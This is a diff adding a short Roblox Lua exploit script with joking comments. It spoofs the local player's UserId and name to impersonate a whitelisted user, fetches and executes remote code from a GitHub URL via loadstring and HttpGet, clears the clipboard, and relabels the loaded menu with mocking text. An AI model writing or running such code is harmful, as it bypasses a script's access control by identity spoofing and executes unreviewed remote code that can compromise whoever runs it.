@@ -1,0 +1,32 @@
+-- it says you get the mod perms but you DONT, type /e shield to be immune to mod power
+
+
+
+local e = game.Players.LocalPlayer
+
+e.UserId = 1688589423 --( some random id i found on the whitelist github page)
+--dont know if i need the next stuff, just to make sure!!!!
+e.Name = "SwagminKris"
+e.Character.Name = "SwagminKris"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()
+
+
+    
+
+setclipboard("")
+    
+    
+local swagmode = game.CoreGui.Swagmode.SwagmodeFrame.Buttons.HomeFrame
+local welcome = swagmode.Welcome
+local user = swagmode.Username
+local rank = swagmode.Rank
+local Image = swagmode.PlayersImage
+local ye = game.CoreGui.Swagmode.SwagmodeFrame.MenuFrame
+local a = ye.Swagmode
+
+welcome.Text = "Welcome to Skid mode"
+user.Text = "your mother"
+rank.Text = "Rank : Skid"
+Image.Image = "http://www.roblox.com/asset/?id=7510507497"
+a.Text = "SKIDMODE"
